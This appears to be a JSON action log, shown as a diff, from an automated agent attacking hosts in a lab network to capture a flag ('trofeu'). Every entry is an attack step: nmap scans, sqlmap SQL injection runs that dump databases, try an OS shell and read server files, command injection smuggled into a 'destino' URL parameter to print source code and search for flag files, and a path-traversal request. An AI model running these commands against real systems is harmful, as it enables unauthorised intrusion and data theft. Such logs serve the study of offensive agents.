+   "assinatura": "curl -s file:///tmp/glhf_reg2.txt",
+   "rotulo": "curl file:///tmp/glhf_reg2.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 131 bytes de corpo, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --level=3 --risk=2 --dbs",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --level=3 --risk=2 --dbs",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 10958 bytes de resposta",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.11:1337/resetdb",
+   "rotulo": "curl http://172.20.0.11:1337/resetdb",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 404, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --level=3 --risk=2 --dump-all --exclude-sysdbs",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --level=3 --risk=2 --dump-all --exclude-sysdbs",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 10880 bytes de resposta",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.11",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.11",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 23,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.11",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.11",
+   "alvo": "172.20.0.11",
+   "redundante": true,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 23,
+   "revisao_ao_abrir": 23
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "netcat 172.20.0.11 1337 <<< $GET /login HTTP/1.1\\r\\nHost: 172.20.0.11\\r\\nConnection: close\\r\\n\\r\\n",
+   "rotulo": "netcat 172.20.0.11 1337 '<<<' '$GET /login HTTP/1.1\\r\\nHost: 172.20.0.11\\r\\nConnection: close\\r\\n\\r\\n'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "netcat falhou (codigo 2): sh: 1: Syntax error: redirection unexpected; executado, codigo 2, 44 bytes de resposta",
+   "revisao": 23,
+   "revisao_ao_abrir": 23
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --level=5 --risk=3 --os-shell",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --level=5 --risk=3 --os-shell",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "sqlmap falhou (codigo -1): tempo esgotado apos 300s; executado, codigo -1, 17743 bytes de resposta",
+   "revisao": 23,
+   "revisao_ao_abrir": 23
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.11",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.11",
+   "alvo": "172.20.0.11",
+   "redundante": true,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 23,
+   "revisao_ao_abrir": 23
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.1",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.1",
+   "alvo": "172.20.0.1",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 2 servicos",
+   "revisao": 24,
+   "revisao_ao_abrir": 23
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -p111,55263 --script=rpcinfo,nfs-showmount,nfs-ls 172.20.0.1",
+   "rotulo": "nmap -sV -p111,55263 --script=rpcinfo,nfs-showmount,nfs-ls 172.20.0.1",
+   "alvo": "172.20.0.1",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 2 servicos",
+   "revisao": 24,
+   "revisao_ao_abrir": 24
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sU --top-ports 50 172.20.0.1",
+   "rotulo": "nmap -sU --top-ports 50 172.20.0.1",
+   "alvo": "172.20.0.1",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 21 servicos",
+   "revisao": 25,
+   "revisao_ao_abrir": 24
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s --compressed http://172.20.0.11:1337/download/readme.txt",
+   "rotulo": "curl --compressed http://172.20.0.11:1337/download/readme.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 2322 bytes de corpo, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.11:1337/download/..%2fapp.py",
+   "rotulo": "curl http://172.20.0.11:1337/download/..%2fapp.py",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 404, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat%20/opt/diagnostico/app.py",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat%20/opt/diagnostico/app.py'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --level=5 --risk=3 --file-read=/app/app.py",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --level=5 --risk=3 --file-read=/app/app.py",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "sqlmap falhou (codigo -1): tempo esgotado apos 300s; executado, codigo -1, 17743 bytes de resposta",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --file-read=/app/app.py",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --file-read=/app/app.py",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 2151 bytes de resposta",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --file-read=/app/app.py --file-dest=/tmp/glhf_app.py -v3",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --file-read=/app/app.py --file-dest=/tmp/glhf_app.py -v3",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 52999 bytes de resposta",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///root/.local/share/sqlmap/output/172.20.0.11/files/",
+   "rotulo": "curl file:///root/.local/share/sqlmap/output/172.20.0.11/files/",
+   "alvo": "172.20.0.5",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///root/.local/share/sqlmap/output/172.20.0.11/files/app/app.py",
+   "rotulo": "curl file:///root/.local/share/sqlmap/output/172.20.0.11/files/app/app.py",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 37); http nao observado, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --file-read=/app/app.py --output-dir=/tmp/sqlmap_glhf",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --file-read=/app/app.py --output-dir=/tmp/sqlmap_glhf",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 2267 bytes de resposta",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///tmp/sqlmap_glhf/172.20.0.11/files/_app_app.py",
+   "rotulo": "curl file:///tmp/sqlmap_glhf/172.20.0.11/files/_app_app.py",
+   "alvo": "172.20.0.5",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 37); http nao observado, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///tmp/sqlmap_glhf/172.20.0.11/files/",
+   "rotulo": "curl file:///tmp/sqlmap_glhf/172.20.0.11/files/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///tmp/sqlmap_glhf/",
+   "rotulo": "curl file:///tmp/sqlmap_glhf/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sn 172.20.0.0/24",
+   "rotulo": "nmap -sn 172.20.0.0/24",
+   "alvo": "172.20.0.1",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "5 hosts, 0 servicos",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "showmount -e 172.20.0.1",
+   "rotulo": "showmount -e 172.20.0.1",
+   "alvo": "172.20.0.1",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 127): bash: line 1: showmount: command not found; o servidor nao registrou sessao aceita; saida: ferramenta ausente neste host: showmount",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///tmp/sqlmap_glhf/172.20.0.11/log",
+   "rotulo": "curl file:///tmp/sqlmap_glhf/172.20.0.11/log",
+   "alvo": "172.20.0.5",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///root/.sqlmap/output/172.20.0.11/files/",
+   "rotulo": "curl file:///root/.sqlmap/output/172.20.0.11/files/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 37); http nao observado, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///tmp/sqlmap_glhf/172.20.0.11_1337/files/",
+   "rotulo": "curl file:///tmp/sqlmap_glhf/172.20.0.11_1337/files/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 37); http nao observado, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --sql-query=SELECT readfile('/app/app.py')",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite '--sql-query=SELECT readfile('\"'\"'/app/app.py'\"'\"')'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 2151 bytes de resposta",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --sql-query=SELECT readfile('/app/app.py') -v 3",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite '--sql-query=SELECT readfile('\"'\"'/app/app.py'\"'\"')' -v 3",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 52999 bytes de resposta",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --tables",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --tables",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 2151 bytes de resposta",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/direct",
+   "rotulo": "curl -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/direct",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite -T users --dump",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite -T users --dump",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 2151 bytes de resposta",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite -T users --dump -v 3",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite -T users --dump -v 3",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 52999 bytes de resposta",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///root/.local/share/sqlmap/output/172.20.0.11/dump/",
+   "rotulo": "curl file:///root/.local/share/sqlmap/output/172.20.0.11/dump/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s file:///tmp/sqlmap_glhf/172.20.0.11/dump/SQLite_masterdb/users.csv",
+   "rotulo": "curl file:///tmp/sqlmap_glhf/172.20.0.11/dump/SQLite_masterdb/users.csv",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 37); http nao observado, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=admin -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite --sql-query=SELECT group_concat(name) FROM sqlite_master WHERE type='table' -v 3",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=admin' -p username --batch --technique=B --level=1 --risk=1 --dbms=sqlite '--sql-query=SELECT group_concat(name) FROM sqlite_master WHERE type='\"'\"'table'\"'\"'' -v 3",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 52999 bytes de resposta",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;find%20/%20-iname%20%22*troph*%22%20-o%20-iname%20%22*flag*%22%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;find%20/%20-iname%20%22*troph*%22%20-o%20-iname%20%22*flag*%22%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  }
+ ],
+ "credenciais_omitidas": 0,
+ "revisao": 25,
+ "trofeu": false
+}
